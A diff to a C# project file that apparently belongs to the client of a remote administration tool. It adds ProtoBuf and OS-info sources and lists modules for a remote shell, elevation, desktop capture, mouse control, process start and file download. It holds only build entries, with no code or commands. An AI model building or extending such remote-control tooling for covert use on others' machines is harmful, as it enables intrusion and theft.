@@ -36,8 +36,6 @@
   </PropertyGroup>
   <ItemGroup>
     <Reference Include="System" />
-    <Reference Include="System.Data" />
-    <Reference Include="System.Deployment" />
     <Reference Include="System.Drawing" />
     <Reference Include="System.Management" />
     <Reference Include="System.Windows.Forms" />
@@ -59,6 +57,7 @@
       <DependentUpon>frmElevation.cs</DependentUpon>
     </Compile>
     <Compile Include="Core\Encryption\AES.cs" />
+    <Compile Include="Core\OSInfo.cs" />
     <Compile Include="Core\Packets\ClientPackets\Commands\DesktopResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\Commands\DirectoryResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\Commands\DownloadFileResponse.cs" />
@@ -85,6 +84,15 @@
     <Compile Include="Core\Packets\ServerPackets\Commands\VisitWebsite.cs" />
     <Compile Include="Core\Packets\ServerPackets\Commands\MouseClick.cs" />
     <Compile Include="Core\Packets\ServerPackets\Commands\StartProcess.cs" />
+    <Compile Include="Core\ProtoBuf\MemberSerializationOptions.cs" />
+    <Compile Include="Core\ProtoBuf\Meta\LockContentedEventArgs.cs" />
+    <Compile Include="Core\ProtoBuf\Meta\LockContentedEventHandler.cs" />
+    <Compile Include="Core\ProtoBuf\Meta\MutableList.cs" />
+    <Compile Include="Core\ProtoBuf\Meta\TypeFormatEventHandler.cs" />
+    <Compile Include="Core\ProtoBuf\ProtoPartialIgnoreAttribute.cs" />
+    <Compile Include="Core\ProtoBuf\ProtoPartialMemberAttribute.cs" />
+    <Compile Include="Core\ProtoBuf\ProtoTypeCode.cs" />
+    <Compile Include="Core\ProtoBuf\TimeSpanScale.cs" />
     <Compile Include="Core\RemoteShell\Shell.cs" />
     <Compile Include="Core\SystemCore.cs" />
     <Compile Include="Core\Encryption\RC4.cs" />
